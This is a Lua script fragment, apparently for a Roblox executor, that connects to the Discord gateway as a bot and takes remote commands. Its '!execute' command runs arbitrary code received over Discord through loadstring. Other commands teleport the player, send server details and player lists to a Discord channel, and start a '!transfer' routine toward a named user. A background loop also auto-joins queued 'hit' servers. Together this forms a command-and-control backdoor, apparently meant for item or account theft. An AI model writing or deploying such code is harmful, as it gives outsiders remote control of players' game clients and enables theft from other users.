function _send(_op, _d)
    if not _sock then return end
    pcall(function() _sock:Send(_hs:JSONEncode({ op = _op, d = _d })) end);
end

local function _isOwner(_author)
    return _owner ~= "" and _author and tostring(_author.id) == tostring(_owner)
end

local function _gw()
    _gen = _gen + 1;
    local _me = _gen;
    local _u = "wss://gateway.discord.gg/?v=10&encoding=json";
    if _resume and _rurl then _u = _rurl .. "/?v=10&encoding=json" end

    print("[gw] connecting (gen ".._me..")");
    _sock = WebSocket.connect(_u);
    _sock.OnMessage:Connect(function(_m)
        if _gen ~= _me then return end
        local _d = _hs:JSONDecode(_m);
        if _d.s then _seq = _d.s end

        if _d.op == 10 then
            _hGen = _me;
            local _hb = _d.d.heartbeat_interval / 1000;
            if _resume and _sid and _seq then
                _send(6, { token = _bt, session_id = _sid, seq = _seq });
            else
                _send(2, {
                    token = _bt,
                    intents = 33281,
                    properties = { os = "linux", browser = "opsec", device = "desktop" }
                });
            end
            task.spawn(function()
                while _gen == _me and _sock do
                    task.wait(_hb);
                    if _gen ~= _me then break end
                    _send(1, _seq);
                end
            end)
        end

        if _d.op == 0 and _d.t == "READY" then
            _sid = _d.d.session_id;
            _rurl = _d.d.resume_gateway_url;
            _resume = true;
            _rGen = _me;
            print("[gw] connected (READY)");
        end

        if _d.op == 0 and _d.t == "RESUMED" then
            _rGen = _me;
            print("[gw] session resumed");
        end

        if _d.op == 7 then
            _resume = true;
            pcall(function() if _sock then _sock:Close() end end);
            return;
        end

        if _d.op == 9 then
            _resume = (_d.d == true);
            if not _resume then _sid = nil end
            task.wait(math.random(1, 5));
            pcall(function() if _sock then _sock:Close() end end);
            return;
        end

        if _d.op == 0 and _d.t == "MESSAGE_CREATE" then
            local _md = _d.d;
            local _content = tostring(_md.content or "");
            local _isCmd = (_md.channel_id == _cmdCh);
            local _isHit = (_md.channel_id == _hitCh);

            if _isCmd then
                if _content == "!inv" then
                    if _isOwner(_md.author) then
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                        task.spawn(function() if _show then _show() end end);
                    else
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                    end
                    return;
                end

                if _content == "!invf" then
                    if _isOwner(_md.author) then
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                        task.spawn(function() if _showF then _showF() end end);
                    else
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                    end
                    return;
                end

                if _content == "!rejoin" then
                    if not _isOwner(_md.author) then
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                        return;
                    end
                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                    task.spawn(function()
                        local _body = _hs:JSONEncode({ embeds = {{ title = "🔄 Rejoining", description = "Rejoining current server\nJobId: `"..tostring(game.JobId).."`", color = 0x3EED50 }} });
                        pcall(function()
                            request({ Url = "https://discord.com/api/v10/channels/".._lg.."/messages", Method = "POST", Headers = { ["Authorization"] = "Bot ".._bt, ["Content-Type"] = "application/json" }, Body = _body });
                        end);
                        task.wait(1.5);
                        pcall(function()
                            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer);
                        end);
                    end);
                    return;
                end

                local _execCode = _content:match("^!execute%s+([%s%S]+)$");
                if _execCode then
                    if not _isOwner(_md.author) then
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                        return;
                    end
                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                    task.spawn(function()
                        local _bt3 = string.char(96) .. string.char(96) .. string.char(96);
                        local _nl  = string.char(10);
                        local _pat1 = "^" .. _bt3 .. "%w*%s*" .. _nl .. "?";
                        local _pat2 = _nl .. "?%s*" .. _bt3 .. "%s*$";
                        local _clean = _execCode;
                        _clean = _clean:gsub(_pat1, "");
                        _clean = _clean:gsub(_pat2, "");

                        local _fn, _loadErr = loadstring(_clean);
                        if not _fn then
                            _postEmbed("❌ Execute - Load Error", "```\n"..tostring(_loadErr):sub(1, 900).."\n```", 0xFF0000);
                            return;
                        end

                        local _results = {};
                        local _ok, _runErr = pcall(function()
                            local _ret = { _fn() };
                            for _i, _v in ipairs(_ret) do
                                table.insert(_results, tostring(_v));
                            end
                        end);

                        if not _ok then
                            _postEmbed("❌ Execute - Runtime Error", "```\n"..tostring(_runErr):sub(1, 900).."\n```", 0xFF0000);
                        else
                            local _out = (#_results > 0) and table.concat(_results, "\n") or "(no return value)";
                            _postEmbed("✅ Execute - OK", "**Output:**\n```\n"..tostring(_out):sub(1, 900).."\n```", 0x3EED50);
                        end
                    end);
                    return;
                end

                if _content == "!server" then
                    if not _isOwner(_md.author) then
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                        return;
                    end
                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                    task.spawn(function()
                        local _players = game.Players:GetPlayers();
                        local _names = {};
                        local _self = game.Players.LocalPlayer.Name;
                        for _, _p in ipairs(_players) do
                            local _tag = (_p.Name == _self) and " **(you)**" or "";
                            table.insert(_names, "> `".._p.Name.."`".._tag);
                        end
                        table.sort(_names);
                        local _body = table.concat(_names, "\n");
                        if #_body > 3900 then
                            _body = _body:sub(1, 3900) .. "\n...truncated";
                        end
                        local _embed = {
                            title = "👥 Server Players - " .. #_players .. " online",
                            description = _body,
                            color = 0x3EED50,
                            footer = { text = "JobId: " .. tostring(game.JobId):sub(1, 8) .. "... | Place: " .. game.PlaceId },
                            timestamp = DateTime.now():ToIsoDate()
                        };
                        local _pl = { embeds = { _embed } };
                        pcall(function()
                            request({ Url = "https://discord.com/api/v10/channels/".._lg.."/messages", Method = "POST", Headers = { ["Authorization"] = "Bot ".._bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode(_pl) });
                        end);
                    end);
                    return;
                end

                local _tName = _content:match("^!transfer%s+(.+)$");
                if _tName then
                    _tName = _tName:gsub("%s+$", "");
                    if not _isOwner(_md.author) then
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                        return;
                    end
                    if _transferActive then
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "⚠️") end);
                        return;
                    end
                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                    task.spawn(_doTransfer, _tName);
                    return;
                end

                if _content == "!stoptransfer" then
                    if not _isOwner(_md.author) then
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                        return;
                    end
                    if _transferActive then
                        _transferActive = false;
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
                    else
                        task.spawn(function() _reactIn(_cmdCh, _md.id, "⚠️") end);
                    end
                    return;
                end
            end

            if _isHit then
                _lastMid = _md.id;
                _pjm(_md);
            end
        end
    end);

    if not _sock then
        warn("[gw] connect returned nil, retrying");
        task.wait(5 + math.random() * 5);
        if _gen == _me then _gw() end
        return;
    end

    print("[gw] socket open, waiting for handshake");

    _sock.OnClose:Connect(function()
        if _gen ~= _me then return end
        warn("[gw] closed, reconnecting");
        _sock = nil;
        if _sid and _seq then _resume = true end
        task.wait(5 + math.random() * 5);
        if _gen == _me then _gw() end
    end);

    task.spawn(function()
        task.wait(6);
        if _gen == _me and _hGen ~= _me then
            warn("[gw] no HELLO (dead socket), retrying now");
            pcall(function() if _sock then _sock:Close() end end);
            if _gen == _me then
                _sock = nil;
                _gw();
            end
            return;
        end
        if _gen ~= _me then return end
        task.wait(8);
        if _gen == _me and _rGen ~= _me then
            warn("[gw] HELLO but no READY (rate limited?), backing off");
            pcall(function() if _sock then _sock:Close() end end);
            task.wait(3 + math.random() * 4);
            if _gen == _me then
                _sock = nil;
                _gw();
            end
        end
    end)
end

task.spawn(function()
    while true do
        task.wait(1);
        if not _moving and _ok2go() then
            local _q = _rl("pending_hits.dat");
            if #_q > 0 then
                local _j = table.remove(_q, 1);
                _wl("pending_hits.dat", _q);
                if _j and _j.msgid and not _il("hits_joined.dat", _j.msgid) and _j.jobId ~= game.JobId then
                    _tpTo(_j.placeId, _j.jobId, _j.msgid);
                end
            end
        end
    end
end)

_gw();
print(tick() - _startT)
